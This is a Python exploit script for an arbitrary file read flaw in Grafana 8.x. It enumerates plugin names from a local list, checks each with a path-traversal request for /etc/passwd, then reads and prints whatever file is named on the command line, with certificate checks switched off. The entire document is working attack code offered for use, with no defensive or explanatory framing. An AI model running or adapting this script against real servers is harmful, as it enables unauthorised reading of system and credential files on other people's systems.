#!/usr/bin/python

import os
import re
import sys
import json
import random
import requests
import argparse
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
	"""function to print banner of the script"""
	print("")
	print("+=====================================+")
	print("|                                     |")
	print("|  G R A F A N A   F I L E   R E A D  |")
	print("|    Coded By: Nehal Zaman (n3hal_)   |")
	print("|                                     |")
	print("+=====================================+")
	print("")

def parseArguments():
	"""function to parse CLI arguments, 
	returns target and filename that we want to read"""
	
	parser = argparse.ArgumentParser(description="Exploit for Grafana 8.X: Arbitrary file read.")
	parser.add_argument("url", type=str, help="specify the target in http(s)://target.tld[:port] format.")
	parser.add_argument("-f", "--file", type=str, default="/etc/passwd", help="specify the file to read.")
	args = parser.parse_args()
	
	return args.url, args.file

def makeRequestToGrafana(target, plugin, filename):
	"""function to make HTTP request to grafana endpoints
	return the content of 'filename' if it is exploitable"""

	#headers
	headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}
	
	#grafana endpoint
	url = f"{target.rstrip('/')}/public/plugins/{plugin}/../../../../../../../../../../../../../../../../../../..{filename}"
	
	try:

		sess = requests.Session()
		req = requests.Request(method="GET", url=url, headers=headers)
		requests.Request
		prep = req.prepare()
		prep.url = url
		response = sess.send(prep, verify=False)
		return response.text

	except requests.exceptions.ConnectTimeout:
		sys.exit("Connection timed out while making request.")

	except requests.exceptions.ProxyError:
		sys.exit("Could connect with the proxy.")

	return None

def isValidPlugin(target, plugin):
	"""given a target and plugin
	this function checks if the plugin is valid
	returns boolean true/false"""

	pattern = "^root:.*:0:0:"
	data = makeRequestToGrafana(target, plugin, "/etc/passwd")

	if data != None:
		if re.match(pattern, data) != None:
			return True
	else:
		sys.exit("Error in making request to Grafana.")

	return False

def enumeratePlugins(target):
	"""function that finds valid plugin
	returns the name of the valid plugin found"""

	validPlugins = []
	pluginsFile = os.path.join(os.getcwd(), "data/plugins.json")
	if os.path.exists(pluginsFile):

		with open(pluginsFile, "r") as rf:

			try:
				plugins = json.loads(rf.read())["plugins"]

				for plugin in plugins:
					if isValidPlugin(target, plugin):
						validPlugins.append(plugin)
				
				return validPlugins

			except KeyError:
				sys.exit("Plugins list is not valid.")

	else:
		sys.exit("Plugins list not found.")

if __name__ == "__main__":

	#parse cli arguments
	target, fileToRead = parseArguments()

	#printing banner
	banner()

	#finding valid plugin
	validPlugins = enumeratePlugins(target)
	print(colored("[*] Total plugins found:", "green"), len(validPlugins))

	#reading the intended file
	if len(validPlugins) > 0:
		contents = makeRequestToGrafana(target, random.choice(validPlugins), fileToRead)
		print(colored(f"[*] Contents of {fileToRead}:", "green"))
		print(contents)